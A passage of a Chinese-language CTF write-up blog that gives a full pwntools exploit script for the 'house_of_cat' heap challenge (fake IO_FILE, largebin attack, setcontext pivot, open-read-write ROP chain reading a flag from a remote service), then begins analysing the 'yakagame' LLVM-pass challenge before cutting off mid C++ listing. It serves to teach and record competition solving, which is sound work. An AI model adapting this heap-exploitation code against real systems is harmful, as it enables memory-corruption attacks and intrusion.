class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stderr</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ubuntu/qwb/houseofcat/house_of_cat&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;47.94.166.51&#x27;</span>,<span class="number">37799</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/qwb/houseofcat/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    run(<span class="string">b&#x27;CAT | r00t QWBQWXFa\xff\xff\xff\xff$&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;plz input your cat choice:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;plz input your cat idx:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;plz input your cat size:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;plz input your content:\n&quot;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;plz input your cat idx:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;plz input your cat idx:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;plz input your cat idx:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;plz input your content:\n&quot;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#make it 1</span></span><br><span class="line">run(<span class="string">b&#x27;LOGIN | r00t QWBQWXFaadmin\x00 &#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x448</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x458</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x460</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">0x21a0d0</span></span><br><span class="line">r.recv(<span class="number">10</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line"></span><br><span class="line">gadget_addr = libc_base+<span class="number">0x1675b0</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">srop_addr = heap_base+<span class="number">0x1c50</span></span><br><span class="line">fake_IO_FILE = <span class="number">2</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_base = 0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)  <span class="comment"># _IO_write_ptr = 0xffffffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_base</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_end</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(next_chain)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x215b80</span>+<span class="number">0x40</span>)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE += p64(srop_addr)  <span class="comment"># rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + <span class="number">0x1800</span>), <span class="number">0x11</span>))</span><br><span class="line"></span><br><span class="line">setcontext_addr = libc_base+libc.sym[<span class="string">&quot;setcontext&quot;</span>]</span><br><span class="line">pop_rdi = libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi = libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12 = libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax = libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall = libc_base+<span class="number">0x0000000000091396</span></span><br><span class="line"></span><br><span class="line">fake_frame_addr = srop_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_data = [</span><br><span class="line">    pop_rdi,</span><br><span class="line">    heap_base+<span class="number">0x1c40</span>+<span class="number">0x28</span>,</span><br><span class="line">    pop_rax,  <span class="comment"># sys_open(&#x27;flag&#x27;, 0)</span></span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    syscall,</span><br><span class="line"></span><br><span class="line">    pop_rax,  <span class="comment"># sys_read(flag_fd, heap, 0x100)</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>,</span><br><span class="line">    pop_rdx_r12,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line"></span><br><span class="line">    pop_rax,  <span class="comment"># sys_write(1, heap, 0x100)</span></span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>,</span><br><span class="line">    pop_rdx_r12,</span><br><span class="line">    <span class="number">0x100</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    syscall</span><br><span class="line">]</span><br><span class="line">orw = p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">3</span>)+p64(syscall)+p64(pop_rdi)+p64(heap_base+<span class="number">0x1c78</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(syscall)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(syscall)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">1</span>)+p64(syscall)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(srop_addr)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(setcontext_addr + <span class="number">61</span>)+<span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload+= p64(heap_base+<span class="number">0x1c50</span>+<span class="number">0x100</span>)+p64(pop_rdi+<span class="number">1</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload+= orw</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x438</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x448</span>,payload)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x468</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x438</span>,<span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">8</span>)<span class="comment">#UAF pointer</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x438</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">stderr_addr = libc_base+libc.sym[<span class="string">&quot;stderr&quot;</span>]</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x418</span>,fake_IO_FILE)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x290</span>)+p64(stderr_addr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x468</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xd31</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x460</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x469</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">guard = libc_base-<span class="number">0x2890</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x24d0</span>)+p64(guard-<span class="number">0x20</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x206</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # delete(11)</span></span><br><span class="line"><span class="comment"># # delete(11)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # delete(8)</span></span><br><span class="line"><span class="comment"># add(14,0x469,b&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment"># delete(12)</span></span><br><span class="line"><span class="comment"># delete(13)</span></span><br><span class="line"><span class="comment"># delete(12)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete(10)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(8,0x460,b&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment"># delete(3)</span></span><br><span class="line"><span class="comment"># edit(5,p64(libc_base+0x21a0e0)*2+p64(heap_base+0x390)+p64(guard-0x20))</span></span><br><span class="line"><span class="comment"># add(9,0x460,b&#x27;a&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># delete(12)</span></span><br><span class="line"></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;plz input your cat idx:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;14&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;plz input your cat size:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x46f</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="challenge-yakagame"><a class="markdownIt-Anchor" href="#challenge-yakagame">#</a> challenge yakagame</h3>
<p><span class="exturl" data-url="aHR0cDovL3huLS1pZGF5YWthLXk4MW5rM3ZsMTRjLnNv">用 ida 打开 yaka.so</span>，找到类似于主函数的函数，在一堆去符号函数中间，代码最长的那个（这里我重命名为 maybethis 了）：</p>
<p><img data-src="https://tvax4.sinaimg.cn/large/008qDYGVly1h4sc5tz6rrj308b0c7mxy.jpg" alt="9413a77d-4c63-41e1-b677-e6e7f556c2c7"></p>
<p>同时发现了后门函数：</p>
<p><img data-src="https://tvax3.sinaimg.cn/large/008qDYGVly1h4sc5xvlkcj30uh05imz7.jpg" alt="a6660091-c555-449e-a98d-e009ebf475b6"></p>
<p>上 Ayaka 看雪上温习了一下 llvm，之前国赛也出过。</p>
<p>程序上刚开始 malloc 了一个 cmd 的堆块，里面存放了一个初始的字符串。</p>
<p>分析一下各地方功能：</p>
<ul>
<li>
<p>程序必须包含在 gamestart 名函数中才能进入主循环，意为，最外层函数名需为 gamestart ()</p>
</li>
<li>
<p>gamestart 函数中有几个小的函数体：</p>
</li>
</ul>
<p>①&quot;fight&quot; 函数：参数个数为 1，将传入的参数作为 idx，将该 weapon [idx] 与 boss 比较，判断是否赢，赢了的话操作<em> score = weapon [idx]-boss。输了的话没有影响。无论输赢都会判断是否进入后门函数。进入后门函数的要求为</em> score&gt;0x12345678。</p>
<p>②&quot;merge&quot; 函数：参数个数为 2，将传入的参数作为 idx1，idx2，执行 weapon [idx1]+=weapon [idx2]</p>
<p>③&quot;destroy&quot; 函数，参数个数为 1，将传入的参数作为 idx，令 weapon [idx]=0</p>
<p>④&quot;upgrade&quot; 函数，参数个数为 1，将传入的参数作为 count (char 大小，有符号位扩展），对每一个 weapon [k] 执行 weapon [k]+=count</p>
<p>⑤四个对 cmd 进行整体字符串操作的函数。同时会减 boss 的值。</p>
<p>⑥else：当函数名不等于以上所有时，会将该该函数名加进 map 中，同时往 weaponlist 指定偏移写一个 char 类型参数。这里 map 和 c<ins>map 对应的位置一样，参考 glibc 中的 srand 和本地起的 srand 同步。可以通过这种同步来进行预测，因此本地写一个 c</ins> map 来模拟。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* arr[] = &#123;</span><br><span class="line">    <span class="string">&quot;lotu&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu1&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu2&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu3&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu4&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu5&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu6&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu7&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu8&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu9&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu10&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu11&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu12&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu13&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu14&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu15&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu16&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu17&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu18&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu19&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu20&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu21&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu22&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu23&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu24&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu25&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu26&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu27&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu28&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu29&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu30&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu31&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu32&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu33&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu34&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu35&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu36&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu37&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu38&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu39&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu40&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu41&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu42&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu43&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu44&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu45&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu46&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu47&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu48&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu49&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu50&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu51&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu52&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu53&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu54&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu55&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu56&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu57&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu58&quot;</span>,</span><br><span class="line"><span class="string">&quot;lotu59&quot;</span>,</span><br><span class="line"><span 